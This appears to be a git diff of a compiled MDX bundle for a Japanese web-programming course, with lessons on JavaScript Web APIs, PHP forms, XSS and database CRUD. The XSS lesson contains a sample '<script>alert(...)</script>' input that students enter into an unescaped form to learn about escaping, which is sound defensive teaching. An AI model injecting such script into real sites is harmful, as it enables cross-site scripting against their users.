r||j("Callout"),n||j("Details"),l||j("Infographic"),i||j("LinkCard"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#04 JavaScript - 関数・WebAPI"}),`
+`})}),e.jsx(r,{type:"info",title:"イベント委譲の活用",children:e.jsxs(s.p,{children:[e.jsx(s.code,{children:"$('body').on('click', '.message-item', function () {...})"}),"は",e.jsx(s.strong,{children:"イベント委譲"}),"という手法です。動的に追加される要素（メッセージ）に対してもクリックイベントが適用されます。"]})}),e.jsx(r,{type:"warning",title:"削除機能の注意点",children:e.jsx(s.p,{children:"この実装では誰でも他人のメッセージを削除できてしまいます。実際のアプリでは、メッセージの作成者のみが削除できるような制御が必要です。"})})]})]})}function Z(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(_,{...d})}):_(d)}function h(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const ee=Object.freeze(Object.defineProperty({__proto__:null,default:Z},Symbol.toStringTag,{value:"Module"}));function P(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,LinkCard:i}=s;return r||j("Callout"),n||j("Details"),l||j("Infographic"),i||j("LinkCard"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#04 JavaScript - 関数・WebAPI"}),`
 `,e.jsx(n,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"関数の概念と使い方を理解する"}),`
 `,e.jsx(s.li,{children:"Web APIの基本的な仕組みを学ぶ"}),`
@@ -2792,14 +2792,17 @@ app.post('/api/chat', async (req, res) => {
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"学習段階"}),": フロントエンドで直接APIを使ってOK"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"本格運用"}),": バックエンドでAPIを呼び出してセキュリティを確保"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"APIキー"}),": 常に安全に管理し、絶対に公開しない"]}),`
-`]})})]})]})}function se(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(T,{...d})}):T(d)}function j(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const ne=Object.freeze(Object.defineProperty({__proto__:null,default:se},Symbol.toStringTag,{value:"Module"}));function A(d){const s={a:"a",code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||m("Callout"),n||m("Details"),l||m("Infographic"),i||m("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#01 PHP - サーバーサイド入門"}),`
+`]})})]})]})}function se(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(P,{...d})}):P(d)}function j(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const ne=Object.freeze(Object.defineProperty({__proto__:null,default:se},Symbol.toStringTag,{value:"Module"}));function A(d){const s={a:"a",br:"br",code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||m("Callout"),n||m("Details"),l||m("Infographic"),i||m("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#01 PHP - サーバーサイド入門"}),`
 `,e.jsx(n,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"PHPの文法を理解する"}),`
-`,e.jsx(s.li,{children:"サーバーサイドプログラミングの基本概念を学ぶ"}),`
 `,e.jsx(s.li,{children:"XAMPPでローカル開発環境を構築する"}),`
-`,e.jsx(s.li,{children:"ファイル操作方法に触れる"}),`
+`,e.jsx(s.li,{children:"PHPの文法を理解する"}),`
 `,e.jsx(s.li,{children:"フォームデータの送受信を体験する"}),`
+`,e.jsx(s.li,{children:"ファイル操作方法に触れる"}),`
 `]})}),`
+`,e.jsxs(r,{type:"note",title:"配布コード",children:[e.jsxs(s.p,{children:["zipファイルをダウンロード後に展開しておいてください！",e.jsx(s.br,{}),`
+`,"その後の作業（ファイル配置や動作確認）は講義でお伝えします"]}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:["講義内資料: ",e.jsx(s.a,{href:"../../zip/php01.zip",children:"php01.zip"})]}),`
+`]})]}),`
 `,e.jsx(s.h2,{children:"XAMPP環境構築"}),`
 `,e.jsxs(n,{summary:"XAMPPとは",children:[e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"複数のサーバー関連ソフトウェアを一括でインストール・管理できるパッケージ"}),`
@@ -2951,7 +2954,7 @@ $birthMonth = 1;
 $isStudent = true;
 
 var_dump($name);      // string(18) "どんぶラッコ"
-var_dump($age);       // int(29)
+var_dump($birthMonth);       // int(1)
 var_dump($isStudent); // bool(true)
 ?>
 `})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"echo - 出力用"})}),e.jsxs(s.ul,{children:[`
@@ -3139,12 +3142,7 @@ $email = $_POST["email"];
 </body>
 </html>
 `})})]}),`
-`,e.jsxs(n,{summary:"XSS（クロスサイトスクリプティング）対策",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"XSSの危険性を体験："})}),e.jsxs(s.p,{children:["フォームの",e.jsx(s.code,{children:"action"}),"を",e.jsx(s.code,{children:"post_confirm_xss.php"}),"に変更してください："]}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-html",children:`<form action="post_confirm_xss.php" method="post">
-    お名前: <input type="text" name="name">
-    Email: <input type="text" name="email">
-    <input type="submit" value="送信">
-</form>
-`})}),e.jsx(s.p,{children:"以下のHTMLタグやJavaScriptをフォームに入力してみましょう："}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-html",children:`<h1>見出しの送信</h1>
+`,e.jsxs(n,{summary:"XSS（クロスサイトスクリプティング）対策",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"XSSの危険性を体験："})}),e.jsx(s.p,{children:"以下のHTMLタグやJavaScriptをフォームに入力してみましょう："}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-html",children:`<h1>見出しの送信</h1>
 <script>alert("XSS攻撃成功！")<\/script>
 `})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"問題が発生する理由："})}),e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"ユーザーの入力をそのままHTMLとして出力すると、HTMLタグやスクリプトが実行される"}),`
@@ -3336,41 +3334,27 @@ echo $config['site_name'];  // "マイサイト"
 ?>
 `})})]}),`
 `,e.jsx(s.h2,{children:"まとめ"}),`
-`,e.jsx(n,{summary:"今回学んだこと",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"サーバーサイドプログラミング"}),e.jsx("div",{className:"text-sm text-slate-600",children:"ブラウザではなくサーバーで実行される処理"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsxs("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:[e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"}),e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M15 12a3 3 0 11-6 0 3 3 0 016 0z"})]})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"XAMPP環境構築"}),e.jsx("div",{className:"text-sm text-slate-600",children:"ローカルでのWebサーバー・データベース環境"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"PHP文法"}),e.jsx("div",{className:"text-sm text-slate-600",children:"変数、配列、関数の基本的な使い方"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"フォーム処理・ファイル操作"}),e.jsx("div",{className:"text-sm text-slate-600",children:"データの送受信と永続化"})]})]})]})})})]})}function re(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(A,{...d})}):A(d)}function m(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const le=Object.freeze(Object.defineProperty({__proto__:null,default:re},Symbol.toStringTag,{value:"Module"}));function I(d){const s={a:"a",code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||p("Callout"),n||p("Details"),l||p("Infographic"),i||p("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#02 PHP - データベース連携（CRUD完全版）"}),`
+`,e.jsx(n,{summary:"今回学んだこと",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"サーバーサイドプログラミング"}),e.jsx("div",{className:"text-sm text-slate-600",children:"ブラウザではなくサーバーで実行される処理"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsxs("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:[e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"}),e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M15 12a3 3 0 11-6 0 3 3 0 016 0z"})]})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"XAMPP環境構築"}),e.jsx("div",{className:"text-sm text-slate-600",children:"ローカルでのWebサーバー・データベース環境"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"PHP文法"}),e.jsx("div",{className:"text-sm text-slate-600",children:"変数、配列、関数の基本的な使い方"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"フォーム処理・ファイル操作"}),e.jsx("div",{className:"text-sm text-slate-600",children:"データの送受信と永続化"})]})]})]})})})]})}function re(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(A,{...d})}):A(d)}function m(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const le=Object.freeze(Object.defineProperty({__proto__:null,default:re},Symbol.toStringTag,{value:"Module"}));function T(d){const s={a:"a",code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||p("Callout"),n||p("Details"),l||p("Infographic"),i||p("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#02 PHP - データベース連携（CRUD完全版）"}),`
 `,e.jsx(n,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"データベース・SQLの概念を理解する"}),`
-`,e.jsx(s.li,{children:"SQL の基本文法（INSERT、SELECT、UPDATE、DELETE）を書けるようになる"}),`
-`,e.jsxs(s.li,{children:["PHPを通じて",e.jsx(s.strong,{children:"CRUD"}),"（Create, Read, Update, Delete）全ての操作ができるようになる"]}),`
-`,e.jsx(s.li,{children:"SQLインジェクション対策の重要性を学ぶ"}),`
-`,e.jsx(s.li,{children:"phpMyAdminでデータベースを操作できるようになる"}),`
-`,e.jsxs(s.li,{children:[e.jsx(s.code,{children:"funcs.php"})," を活用してコードの再利用性を高める"]}),`
-`,e.jsx(s.li,{children:"関数化によってコードの保守性を向上させる"}),`
+`,e.jsx(s.li,{children:"SQLの基本文法（INSERT、SELECT、UPDATE、DELETE）を習得する"}),`
+`,e.jsxs(s.li,{children:["PHPからデータベースの",e.jsx(s.strong,{children:"CRUD操作"}),"ができるようになる"]}),`
+`,e.jsx(s.li,{children:"SQLインジェクション対策と関数化で安全なコードを書けるようになる"}),`
 `]})}),`
-`,e.jsxs(n,{summary:"授業前準備",children:[e.jsx(r,{type:"tip",title:"PHPの授業では毎回同じ手順を実施",children:e.jsx(s.p,{children:"授業開始前に以下の準備を実施する"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"XAMPP起動手順："})}),e.jsxs(s.ol,{children:[`
-`,e.jsxs(s.li,{children:[`
-`,e.jsx(s.p,{children:e.jsx(s.strong,{children:"Apache と MySQL を起動"})}),`
-`,e.jsxs(s.ul,{children:[`
+`,e.jsxs(r,{type:"note",title:"配布コード",children:[e.jsxs(s.p,{children:["zipファイルをダウンロード後に展開し、XAMPPの",e.jsx(s.code,{children:"htdocs"}),"フォルダに配置してください！"]}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:["講義内資料: ",e.jsx(s.a,{href:"../../zip/php02.zip",children:"php02.zip"})]}),`
+`]})]}),`
+`,e.jsxs(n,{summary:"授業前準備",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"1. XAMPP起動"})}),e.jsxs(s.ul,{children:[`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Windows"}),": Apache と MySQL が緑色になっていればOK"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Mac"}),': MySQL Database と Apache Web Server が "Running" になっていればOK']}),`
-`]}),`
-`]}),`
-`,e.jsxs(s.li,{children:[`
-`,e.jsx(s.p,{children:e.jsx(s.strong,{children:"ファイル配置"})}),`
-`,e.jsxs(s.ul,{children:[`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"2. ファイル配置"})}),e.jsxs(s.ul,{children:[`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Windows"}),": ",e.jsx(s.code,{children:"C:/XAMPP/htdocs/php02/"})]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Mac"}),": ",e.jsx(s.code,{children:"/Applications/XAMPP/htdocs/php02/"})]}),`
-`]}),`
-`]}),`
-`,e.jsxs(s.li,{children:[`
-`,e.jsx(s.p,{children:e.jsx(s.strong,{children:"動作確認"})}),`
-`,e.jsxs(s.ul,{children:[`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"3. 動作確認"})}),e.jsxs(s.ul,{children:[`
 `,e.jsxs(s.li,{children:[e.jsx(s.code,{children:"http://localhost/php02/"})," にアクセス"]}),`
-`]}),`
-`]}),`
 `]})]}),`
 `,e.jsx(s.h2,{children:"データベースとSQLの基礎"}),`
 `,e.jsxs(n,{summary:"データベースとは何か？",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"データベース（DB）"})," とは、「ある特定の条件に沿ってデータを集めたもの」です。"]}),e.jsx(r,{type:"warning",title:"重要なポイント",children:e.jsx(s.p,{children:`単にデータを集めた"だけ"ではデータベースではない！
-データを効率的に管理・検索・更新できる仕組みが必要`})}),e.jsx(l,{children:e.jsxs("div",{className:"text-center",children:[e.jsx("div",{className:"inline-flex items-center justify-center w-16 h-16 bg-slate-100 rounded-full mb-4",children:e.jsx("div",{className:"w-8 h-8 text-slate-600",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4"})})})}),e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"データベースの役割"}),e.jsx("div",{className:"text-sm text-slate-600 max-w-md mx-auto",children:e.jsx(s.p,{children:"大量のデータを効率的に保存・検索・更新・削除できる仕組み"})})]})})]}),`
+データを効率的に管理・検索・更新できる仕組みが必要`})}),e.jsxs(l,{children:[e.jsxs("div",{className:"grid grid-cols-2 md:grid-cols-4 gap-4",children:[e.jsxs("div",{className:"text-center p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"w-8 h-8 mx-auto mb-2 text-green-600",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 4v16m8-8H4"})})}),e.jsx("div",{className:"font-medium text-green-800",children:"Create"}),e.jsx("div",{className:"text-xs text-green-700",children:"新規作成"})]}),e.jsxs("div",{className:"text-center p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"w-8 h-8 mx-auto mb-2 text-blue-600",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"})})}),e.jsx("div",{className:"font-medium text-blue-800",children:"Read"}),e.jsx("div",{className:"text-xs text-blue-700",children:"検索・取得"})]}),e.jsxs("div",{className:"text-center p-4 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"w-8 h-8 mx-auto mb-2 text-orange-600",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"})})}),e.jsx("div",{className:"font-medium text-orange-800",children:"Update"}),e.jsx("div",{className:"text-xs text-orange-700",children:"更新・編集"})]}),e.jsxs("div",{className:"text-center p-4 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"w-8 h-8 mx-auto mb-2 text-red-600",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"})})}),e.jsx("div",{className:"font-medium text-red-800",children:"Delete"}),e.jsx("div",{className:"text-xs text-red-700",children:"削除"})]})]}),e.jsx("div",{className:"text-center mt-4 text-sm text-slate-600",children:e.jsx(s.p,{children:"データベースはこの4つの操作（CRUD）でデータを管理する"})})]})]}),`
 `,e.jsxs(n,{summary:"リレーショナルデータベース（RDB）とは",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"リレーショナルデータベース"}),"は、データを",e.jsx(s.strong,{children:"表（テーブル）の形式"}),"で管理する方式"]}),e.jsx(l,{children:e.jsx("div",{className:"space-y-4",children:e.jsxs("div",{className:"bg-slate-50 p-4 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-3",children:"データベースの構造"}),e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"w-full border-collapse bg-white",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-blue-100",children:[e.jsx("th",{className:"border border-slate-300 p-2 text-sm font-medium",children:"ID"}),e.jsx("th",{className:"border border-slate-300 p-2 text-sm font-medium",children:"名前"}),e.jsx("th",{className:"border border-slate-300 p-2 text-sm font-medium",children:"メール"}),e.jsx("th",{className:"border border-slate-300 p-2 text-sm font-medium",children:"登録日"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"border border-slate-300 p-2 text-sm",children:"1"}),e.jsx("td",{className:"border border-slate-300 p-2 text-sm",children:"田中太郎"}),e.jsx("td",{className:"border border-slate-300 p-2 text-sm",children:e.jsx(s.a,{href:"mailto:tanaka@example.com",children:"tanaka@example.com"})}),e.jsx("td",{className:"border border-slate-300 p-2 text-sm",children:"2025-01-15"})]}),e.jsxs("tr",{className:"bg-slate-50",children:[e.jsx("td",{className:"border border-slate-300 p-2 text-sm",children:"2"}),e.jsx("td",{className:"border border-slate-300 p-2 text-sm",children:"佐藤花子"}),e.jsx("td",{className:"border border-slate-300 p-2 text-sm",children:e.jsx(s.a,{href:"mailto:sato@example.com",children:"sato@example.com"})}),e.jsx("td",{className:"border border-slate-300 p-2 text-sm",children:"2025-01-16"})]})]})]})}),e.jsxs("div",{className:"grid grid-cols-2 gap-4 mt-4",children:[e.jsxs("div",{className:"text-sm",children:[e.jsx("div",{className:"font-medium text-blue-700",children:"縦方向（列・フィールド）"}),e.jsx("div",{className:"text-slate-600",children:"ID、名前、メールなどの項目"})]}),e.jsxs("div",{className:"text-sm",children:[e.jsx("div",{className:"font-medium text-green-700",children:"横方向（行・レコード）"}),e.jsx("div",{className:"text-slate-600",children:"1人分のデータセット"})]})]})]})})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"基本用語："})}),e.jsxs(s.ul,{children:[`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"テーブル"}),": データを格納する表"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"行（レコード）"}),": 1件分のデータ（横方向）"]}),`
@@ -3398,6 +3382,44 @@ graph LR
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"UPDATE"}),": データの更新"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"DELETE"}),": データの削除"]}),`
 `]}),e.jsx(r,{type:"info",title:"標準化された言語",children:e.jsx(s.p,{children:"SQLは国際標準（ISO）として規格化されているため、MySQL、PostgreSQL、SQLiteなど、どのRDBMSでも基本的な文法は共通"})})]}),`
+`,e.jsx(s.h2,{children:"今回作るシステムの概要"}),`
+`,e.jsxs(n,{summary:"アンケートフォームを作ろう",children:[e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:["今回は ",e.jsx(s.strong,{children:"アンケートフォーム"})," システムを作りながら、データベース操作（CRUD）を学ぶ"]}),`
+`]}),e.jsx(r,{type:"info",title:"アンケートフォームの機能",children:e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:["ユーザーからの回答を ",e.jsx(s.strong,{children:"保存"}),"（Create）"]}),`
+`,e.jsxs(s.li,{children:["回答一覧を ",e.jsx(s.strong,{children:"表示"}),"（Read）"]}),`
+`,e.jsxs(s.li,{children:["回答内容を ",e.jsx(s.strong,{children:"編集"}),"（Update）"]}),`
+`,e.jsxs(s.li,{children:["不要な回答を ",e.jsx(s.strong,{children:"削除"}),"（Delete）"]}),`
+`]})}),e.jsx(i,{children:`
+flowchart LR
+  subgraph "ユーザー操作"
+      A[フォーム入力] --> B[送信]
+      C[一覧表示] --> D[詳細確認]
+      D --> E[編集]
+      D --> F[削除]
+  end
+  
+  subgraph "PHPファイル"
+      G[insert.php]
+      H[select.php]
+      I[detail.php]
+      J[update.php]
+      K[delete.php]
+  end
+  
+  subgraph "データベース"
+      L[(MySQL)]
+  end
+  
+  B --> G --> L
+  C --> H --> L
+  D --> I --> L
+  E --> J --> L
+  F --> K --> L
+`})]}),`
+`,e.jsxs(n,{summary:"CRUDとは？",children:[e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"データベース操作の基本となる4つの機能の頭文字をとった言葉"}),`
+`]}),e.jsxs(s.table,{children:[e.jsx(s.thead,{children:e.jsxs(s.tr,{children:[e.jsx(s.th,{children:"操作"}),e.jsx(s.th,{children:"意味"}),e.jsx(s.th,{children:"SQL文"})]})}),e.jsxs(s.tbody,{children:[e.jsxs(s.tr,{children:[e.jsxs(s.td,{children:[e.jsx(s.strong,{children:"C"}),"reate"]}),e.jsx(s.td,{children:"データの新規作成"}),e.jsx(s.td,{children:"INSERT"})]}),e.jsxs(s.tr,{children:[e.jsxs(s.td,{children:[e.jsx(s.strong,{children:"R"}),"ead"]}),e.jsx(s.td,{children:"データの読み取り・検索"}),e.jsx(s.td,{children:"SELECT"})]}),e.jsxs(s.tr,{children:[e.jsxs(s.td,{children:[e.jsx(s.strong,{children:"U"}),"pdate"]}),e.jsx(s.td,{children:"データの更新・編集"}),e.jsx(s.td,{children:"UPDATE"})]}),e.jsxs(s.tr,{children:[e.jsxs(s.td,{children:[e.jsx(s.strong,{children:"D"}),"elete"]}),e.jsx(s.td,{children:"データの削除"}),e.jsx(s.td,{children:"DELETE"})]})]})]}),e.jsx(r,{type:"info",title:"Webアプリの基本",children:e.jsx(s.p,{children:"ほとんどのWebアプリケーション（SNS、ECサイト、ブログなど）はこのCRUD操作の組み合わせで成り立っています！"})})]}),`
 `,e.jsx(s.h2,{children:"phpMyAdminとデータベース作成"}),`
